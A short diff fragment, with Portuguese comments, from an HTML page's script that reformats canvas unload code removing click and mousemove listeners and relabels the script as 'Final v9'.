-                 const el = document.getElementById('interactive-canvas'); if(el){ if(canvasClickListenerCanvas_final) el.removeEventListener('click',canvasClickListenerCanvas_final); if(canvasMoveListenerCanvas_final) el.removeEventListener('mousemove',canvasMoveListenerCanvas_final); console.log("[Canvas Unload] Listeners removidos."); }
-             } catch(e) { console.warn("[Canvas Unload] Erro:", e); }
+             try { /* ... (código limpeza omitido - igual v8, usa nomes _final) ... */ const el=document.getElementById('interactive-canvas'); if(el){ if(canvasClickListenerCanvas_final)el.removeEventListener('click',canvasClickListenerCanvas_final); if(canvasMoveListenerCanvas_final)el.removeEventListener('mousemove',canvasMoveListenerCanvas_final); console.log("[Canvas Unload] Listeners removidos."); } } catch(e) { console.warn("[Canvas Unload] Erro:", e); }
          });
-         // --- FIM DO SCRIPT 2 (Final) ---
+         // --- FIM DO SCRIPT 2 (Final v9) ---
     </script>
 
 </body>
